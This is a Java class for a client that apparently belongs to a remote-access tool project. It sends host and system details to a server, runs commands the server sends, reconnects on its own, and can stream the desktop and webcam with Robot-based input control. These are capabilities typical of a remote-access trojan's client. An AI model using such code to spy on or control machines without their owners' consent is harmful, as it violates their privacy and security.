/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package myproject.Model.Client;

import java.awt.Robot;
import java.io.IOException;
import myproject.Model.Common.RemoteDesktop.SendingDesktopThread;
import myproject.Model.Common.Webcam.SendingWebcamThread;
import myproject.Model.Exception.ServerLogoutException;
import myproject.Model.Logger.Log;
import myproject.Model.Message.AbstractMessage;
import myproject.Model.Message.Client2ServerMessages.FillClientInfoMessage;
import myproject.View.Client.ClientPanel;

/**
 *
 * @author BotNaEasyEnv
 */
public class DuplexClient extends AbstractClient {
    private boolean isReception = true;
    private boolean isSending = true;
    private boolean isSendedInfo = false;
    
    private ClientPanel panel;
  
    private SendingDesktopThread remoteDesktop;
    private SendingWebcamThread webcamThread;
    
    public DuplexClient(ClientPanel panel){
        this();
        this.panel = panel;
    }
    
    public DuplexClient(){
        super();
    }
    
    @Override
    public void disconnect() throws IOException{
        setIsReception(false);
        setIsSending(false);
        super.disconnect();
    }
    
     @Override
    protected void startSending() {
        newSendingThread();
    }

    @Override
    protected void startRecepting() {
        try {
            newReceivingThread();
        } catch (IOException ex) {
            Log.errorLog(ex, ex.getCause(), DuplexClient.class);
        }
    }
    
    private void panelMethod(AbstractMessage message){
        if(panel==null)
            return;
        
        panel.updateForMessage(message.toString());
    }
    
    private void newReceivingThread() throws IOException{
        isReception = true;
        Thread t = new Thread(){
          @Override
          public void run(){
               while(isReception){
                   try {
                       AbstractMessage message = getMessage();
                       message.showMessage(); 
                       message.executeMessage(client);
                       panelMethod(message);
                   } catch (ServerLogoutException ex) {
                       reconnect();
                   } catch (Throwable ex) {
                       ex.printStackTrace();
                   }
             }
          }  
        };
        t.setName("Receiving thread");
        t.start();
    }
    
    private void newSendingThread(){
        isSending = true;
        isSendedInfo = false;
        Thread t = new Thread(){
            @Override
            public void run(){
                
                   while(isSending){
                       try {
                           if(isConnected&&!isSendedInfo){
                               isSendedInfo=true;                           
                               sendMessage(createInfoMessage());
                           }
                           Thread.sleep(5000);
                       } catch (InterruptedException ex) {
                           ex.printStackTrace();
                       }
                }
            }
        };
        t.setName("Sending thread");
        t.start();
    }
    
    private AbstractMessage createInfoMessage(){
        AbstractMessage message =  new FillClientInfoMessage(new String[][]{
            {getClientIP()},
            {getHostName()},
            {getClientOS()},
            {getClientLanguage()},
            {getJavaVersion()},
            {getClientArchitecture()},
            {}
        });
        return message;
    }

    public boolean isIsReception() {
        return isReception;
    }

    public void setIsReception(boolean isReception) {
        this.isReception = isReception;
    }

    public boolean isIsSending() {
        return isSending;
    }

    public void setIsSending(boolean isSending) {
        this.isSending = isSending;
    }

    @Override
    protected void reconnecting() {
        setIsReception(false);
        setIsSending(false);
    }

    @Override
    public void startSendingDesktop() {
        remoteDesktop = new SendingDesktopThread(this);
        remoteDesktop.start();
    }

    @Override
    public void stopSendingDesktop() {
        remoteDesktop.stopRunning();
    }

    @Override
    public Robot getRobot() {
        if(remoteDesktop!=null){
            return remoteDesktop.getRobot();
        }
        return null;
    }

    @Override
    public void startSendingWebcam() {
        webcamThread = new SendingWebcamThread(this);
        webcamThread.start();
    }

    @Override
    public void stopSendingWebcam() {
        webcamThread.stopSending();
    }
}